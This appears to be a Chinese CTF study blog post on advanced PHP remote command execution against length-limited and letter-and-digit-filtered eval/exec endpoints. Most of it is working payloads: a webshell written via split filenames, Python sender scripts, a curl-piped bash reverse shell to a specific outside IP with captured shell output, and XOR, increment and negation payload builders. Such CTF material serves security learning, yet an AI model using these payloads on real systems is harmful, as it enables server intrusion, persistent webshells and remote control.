# rce_进阶


进阶版rce_payload

<!--more-->

### 字符数量限制bypass

题目限制了命令的长度，只能7个字符。

```php
<?php
    $sandbox = dirname(__FILE__).'/sandbox_' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    mkdir($sandbox,0755,true);
    chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
?>
```

我们可以利用Linux命令特性，来写入一句话木马

每次提交不超过7个字符的命令，写入一句话木马的执行语句到文件名，然后通过`sh a ls -t`，利用文件名组成写入一句话木马的命令

要写入的一句话木马：

```php
<?php eval($_GET[1]);
```

base64编码后:

```
PD9waHAgZXZhbCgkX0dFVFsxXSk7
```

最终需要被执行的语句：

```
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php
```

然后将语句分拆，输出为文件名：

```
>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0
```

用python打payload，把上面的payload写入execpayload.txt里面

```python
import requests

url = "http://xxxxx/index.php?cmd={0}"
print("[+]start attack!!!")
with open("execpayload.txt", "r") as f:
    for i in f:
        print("[*]" + url.format(i.strip()))
        requests.get(url.format(i.strip()))
```

最终会在目录下生成1.php，里面就是一句话木马

如果是五位字符限制，则最后用

```
>ls\\
ls>a
>\ \\
>-t\\
>\>0

ls>>a

sh a
```

四位：

```
>f\>
>ht-
>sl
>dir
*>v
>rev
*v>0

cat 0
```

**这里是利用Linux的命令特性，起初在windows下搭建的环境需要修改成windows的终端命令**

### 无回显rce

无回显rce是远程服务器上执行命令后，前段不会显示执行结果。这个时候需要使用curl或反弹shell进行绕过

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
```

无回显可以通过增加参数sleep进行判断

```undefined
ls|sleep 10 
```

如返回时间有明显差异，则代表命令执行成功。
对于无参数RCE，可以使用反弹shell

### 字符数量限制bypass2

curl反弹shell：利用curl的反弹shell技巧，构造反弹shell语句，利用curl 访问目标地址|hash，执行目标地址上的反弹shell语句。

例题：

```php
<?php
    error_reporting(E_ALL);
    $sandbox = dirname(__FILE__).'/sandbox_' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    mkdir($sandbox,0755,true);
    chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 6) {
        exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

利用vps，搭建80服务，存入反弹shell的语句，效果如下：

```
访问：http://81.71.84.61/
显示：bash -i >& /dev/tcp/219.152.63.100/8000 0>&1
```

利用linux特性写入一句话木马，由于限制字符数量限制，此处分开两部分执行。

用于接收shell的机器要开启端口监听

```
nc -lv 8000
```

**第一部分：**

```bash
>ls\\
ls>_
>\ \\
>-t\\
>\>y
ls>>_
```

此部分主要是分两段，写入文件`_`中。首先写入`ls`字符，然后追加写入`-t >y`，这样执行`sh _`，即执行`ls -t >y`。此语句等于0x09的`ls -t>0`

**第二部分：**

构造curl 81.71.84.61|bash（curl访问这个地址即返回bash -i >& /dev/tcp/219.152.63.100/8000 0>&1这句话），从而执行反弹shell

```bash
 ">bash",
    ">\|\\",
    ">61\\",
    ">84.\\",
    ">71.\\",
    ">81.\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
```

由于有字符限制，所以按照上述拆分。
最后，执行sh _，然后执行sh y 即可
具体python代码如下：

```python
import requests
baseurl = "http://81.71.84.61:50002/?cmd="
reset = "http://81.71.84.61:50002/?reset"
s = requests.session()
s.get(reset)

# 将ls -t 写入文件_
list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]

# curl 120.79.33.253|bash
# curl 219.152.63.100|bash
# curl 81.71.84.61|bash
list2=[
    ">bash",
    ">\|\\",
    ">61\\",
    ">84.\\",
    ">71.\\",
    ">81.\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]


for i in list:
    url = baseurl+str(i)
    s.get(url)


for j in list2:
    url = baseurl+str(j)
    s.get(url)

s.get(baseurl+"sh _")
s.get(baseurl+"sh y")
#s.get(reset)
```

效果如下：

```ruby
[root@gr8oqhchd ~]# nc -lv 8000
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 81.71.84.61.
Ncat: Connection from 81.71.84.61:43998.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ ls /
ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www-data@314b51:~/html/sandbox_92f06c44fa329edc79eafc1eb$ 
```











## 无字母数字rce

以下三种方法可以用来解决类似这种无字母数字rce

```php
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("hacker!");
}
@eval($code);
?>
```

### 异域构造

```
$__=("#"^"|"); // _
$__.=("."^"~"); // _P
$__.=("/"^"`"); // _PO
$__.=("|"^"/"); // _POS
$__.=("{"^"/"); // _POST 
$$__[_]($$__[__]); // $_POST[_]($_POST[__]);
```

随后合并并编码得到：

```
%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B
```

搭建本地环境进行测试

由于本地是Windows环境，所以执行的命令是dir

payload：

```
code=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B&_=system&__=dir
```

![image-20230709000012647](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png)

我们可以通过脚本来实现构造

```python
import re
import requests
import urllib
from sys import *
import os

a=[]
ans1="" 
ans2=""
for i in range(0,256): #设置i的范围
    c=chr(i)
    #将i转换成ascii对应的字符，并赋值给c
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c,re.I)
    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符
    if(tmp):
        continue
        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可
    else:
        a.append(i)
        #在数组中增加i，这些就是未被系统过滤掉的字符

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="dir"      #参数
def myfun(k,my): #自定义函数
    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错
    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错
    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 
        for j in range(i,len(a)): #在上个循环的条件下设置j的范围
            if(a[i]^a[j]==ord(my[k])):
                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])
                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])
                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符
for x in range(0,len(mya)): #设置k的范围
    myfun(x,mya)#引用自定义的函数
data1="('"+urllib.request.quote(ans1)+"'^'"+urllib.request.quote(ans2)+"')" #data1等于传入的命令,"+ans1+"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值
print(data1)
ans1=""#对ans1进行重新赋值
ans2=""#对ans2进行重新赋值
for k in range(0,len(myb)):#设置k的范围为(0,len(myb))
    myfun(k,myb)#再次引用自定义函数
data2="(\""+urllib.request.quote(ans1)+"\"^\""+urllib.request.quote(ans2)+"\")"
print(data2)
```

构造system('dir');

payload:

```
code=('%0C%05%0C%08%05%0D'^'%7F%7C%7F%7C%60%60')("%04%09%0D"^"%60%60%7F");
```

![image-20230709000624874](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png)

### 自增构造

```php
<?php
$_=[].'';//Array
$_=$_[''=='$'];//A
$_++;//B
$_++;//C
$_++;//D
$_++;//E
$__=$_;//E
$_++;//F
$_++;//G
$___=$_;//G
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T
$_=$___.$__.$_;//GET
//var_dump($_);
$_='_'.$_;//_GET
var_dump($$_[_]($$_[__]));
//$_GET[_]($_GET[__])
```

随后可以尝试给`_`和`__`进行GET传参，我们把换行去掉，然后进行一次URL编码（中间件会解码一次），所以我们构造的payload先变成这样：

```
$_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]);
```

编码之后

```
%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
```

然后传参`&_=system&__=dir;`
![image-20230709001759231](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png)

如果是POST传参方式也可以这样：

![image-20230709002008799](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png)

> 在自增中，可以通过特殊字符构造出字符串的有以下几种方式
>
> ```
> [].''  //Array
> (0/0).''   //NAN
> (1/0).''   //INF
> ```
>
> 如果ban了数字：
>
> ```
> a/a	 //NAN
> _/_	 //NAN
> INF	 //1/a
> ```





### 取反构造

利用不可见字符，进行两次取反,得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。

这里的话利用一个php脚本即可获取我们想要的字符

```PHP
<?php
$ans1='system';//函数名
$ans2='dir';//命令
$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system
$data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir
echo ('('.$data1.')'.'('.$data2.')'.';');
```

本地测试

![image-20230709004904597](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png)

然后
![image-20230709005351719](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png)





参考：

[CTF随笔-RCE进阶](https://www.jianshu.com/p/955bae08f5e1)
